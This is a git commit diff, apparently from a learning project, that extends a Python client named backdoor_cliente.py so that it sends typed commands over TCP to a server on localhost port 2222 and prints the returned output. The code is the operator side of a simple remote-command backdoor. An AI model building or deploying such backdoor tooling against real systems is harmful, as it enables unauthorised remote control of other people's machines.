6a1265b450e91923ea0758180fab294181f90d51
Andrés Hernández Mata <andreshernandezmta@gmail.com>
2021-04-08 23:47:04 -0500

    Enviando los comandos
    Estableciendo conexion

--- src/backdoor_cliente.py
+++ src/backdoor_cliente.py
@@ -9,16 +9,28 @@ Fecha: 08 Abril 2020
 import socket
 import sys
 
-servidor = ("127.0.0.1", 2000)
+servidor = ("127.0.0.1", 2222)
 bufferSize = 1024
 
 TCPClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 TCPClientSocket.connect(servidor)
-print("[-] Iniciando conexión...")
+print("[+] Estableciendo conexión...")
 
 while True:
+    print("[-] Ingrese el comando a ejecutar...")
     comando = input("> ")
     if comando == "exit":
+        print("[-] Cerrando conexion...")        
         TCPClientSocket.close()
-        sys.exit
+        print("[+] Saliendo...")        
+        print("[-] Bye")
+        sys.exit()
+    else:
+        print("[+] Enviando comando...")
+        TCPClientSocket.sendto(str.encode(comando), servidor)
+        salida = TCPClientSocket.recv(bufferSize)
+        print("[-] Espere un momento...")
+        resultado = salida.decode()
+        print("[+] Salida")
+        print(resultado)
 
